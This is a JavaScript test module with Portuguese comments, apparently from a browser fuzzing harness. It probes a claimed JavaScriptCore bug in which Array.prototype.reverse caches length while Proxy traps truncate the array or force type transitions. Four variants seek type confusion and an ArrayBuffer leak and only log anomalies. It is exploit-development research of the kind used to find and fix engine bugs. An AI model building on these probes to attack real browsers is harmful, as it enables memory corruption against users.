'use strict';
/**
 * Teste 14 — Array.prototype.reverse + Proxy: Type Confusion EXPLOITAÇÃO
 *
 * Bug confirmado no Teste 3E:
 *   reverse() continuou executando após t.length = 3
 *   → C++ cacheia length no início e não re-verifica
 *
 * Estratégia de exploração:
 *   1. Criar array grande com DoubleArray
 *   2. Durante reverse(), truncar length e forçar transição de tipo
 *   3. O C++ continua escrevendo além do novo length
 *   4. Escrever objetos (ponteiros) em posições que o C++ pensa serem doubles
 *
 * Variantes:
 *   A — reverse() + length truncado + escrita de objeto
 *   B — reverse() + transição DoubleArray→ContiguousArray
 *   C — reverse() em Proxy com getter malicioso
 *   D — Combinar com ArrayBuffer para leak
 */
(function (global) {
  global.FuzzerTests = global.FuzzerTests || {};

  global.FuzzerTests['14'] = {
    id      : 14,
    name    : 'Array.reverse + Proxy — Type Confusion EXPLOITAÇÃO',
    category: 'JSC-Exploit',
    timeout : 5000,

    run: function () {
      var anomalies = [];

      /* ── Variante A: reverse() + truncar length + escrita de objeto ── */
      (function variantA() {
        try {
          var target = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];
          var step   = 0;

          var proxy = new Proxy(target, {
            set: function (t, prop, val, recv) {
              step++;
              if (step === 2) {
                /* No meio do reverse, truncar e inserir objeto */
                t.length = 3;
                /* Forçar transição para ContiguousArray */
                t[0] = {};
              }
              return Reflect.set(t, prop, val, recv);
            }
          });

          proxy.reverse();

          /* Verificar se o C++ escreveu além do length=3 */
          if (target.length > 3) {
            anomalies.push('A: length não truncado: ' + target.length);
          }
          for (var i = 3; i < 8; i++) {
            if (target[i] !== undefined) {
              anomalies.push('A: target[' + i + ']=' + target[i] + ' após truncamento');
            }
          }
        } catch (e) {
          anomalies.push('A: ' + String(e));
        }
      }());

      /* ── Variante B: reverse() + transição de tipo ── */
      (function variantB() {
        try {
          var target = [1.1, 2.2, 3.3, 4.4, 5.5];
          var count  = 0;

          var proxy = new Proxy(target, {
            get: function (t, prop, recv) {
              if (prop === 'length') {
                count++;
                if (count === 1) {
                  /* Na primeira leitura de length, forçar transição */
                  t[0] = {};
                }
              }
              return Reflect.get(t, prop, recv);
            }
          });

          proxy.reverse();

          /* Verificar integridade */
          if (typeof target[0] !== 'object') {
            anomalies.push('B: target[0] deveria ser objeto após transição');
          }
        } catch (e) {
          if (!(e instanceof TypeError)) {
            anomalies.push('B: ' + String(e));
          }
        }
      }());

      /* ── Variante C: reverse() com getter que retorna objeto ── */
      (function variantC() {
        try {
          var target = [1.1, 2.2, 3.3, 4.4, 5.5];
          var calls  = 0;

          var proxy = new Proxy(target, {
            get: function (t, prop, recv) {
              if (!isNaN(Number(prop))) {
                calls++;
                if (calls === 3) {
                  /* Retornar objeto em vez de número */
                  return { fake: true };
                }
              }
              return Reflect.get(t, prop, recv);
            }
          });

          proxy.reverse();

          /* Se o C++ usou o objeto como número, pode haver corrupção */
          var hasObject = false;
          for (var i = 0; i < target.length; i++) {
            if (typeof target[i] === 'object' && target[i] !== null) {
              hasObject = true;
            }
          }
          if (hasObject) {
            anomalies.push('C: objeto encontrado no array após reverse com getter malicioso');
          }
        } catch (e) {
          anomalies.push('C: ' + String(e));
        }
      }());

      /* ── Variante D: reverse() + ArrayBuffer leak ── */
      (function variantD() {
        try {
          var buf    = new ArrayBuffer(64);
          var view   = new Uint32Array(buf);
          view[0]    = 0xDEADBEEF;

          var target = [1.1, 2.2, 3.3, 4.4, 5.5];
          var proxy = new Proxy(target, {
            set: function (t, prop, val, recv) {
              if (prop === '2') {
                /* Substituir por view do ArrayBuffer */
                return Reflect.set(t, prop, view, recv);
              }
              return Reflect.set(t, prop, val, recv);
            }
          });

          proxy.reverse();

          /* Verificar se a view foi reinterpretada */
          var final = target[2];
          if (typeof final === 'number' && final !== view) {
            anomalies.push('D: ArrayBuffer view reinterpretado como número: ' + final);
          }
        } catch (e) {
          anomalies.push('D: ' + String(e));
        }
      }());

      if (anomalies.length > 0) {
        return { status: 'ANOMALY', detail: anomalies.join(' | ') };
      }
      return { status: 'PASS', detail: 'A-D sem anomalias' };
    }
  };

}(window));
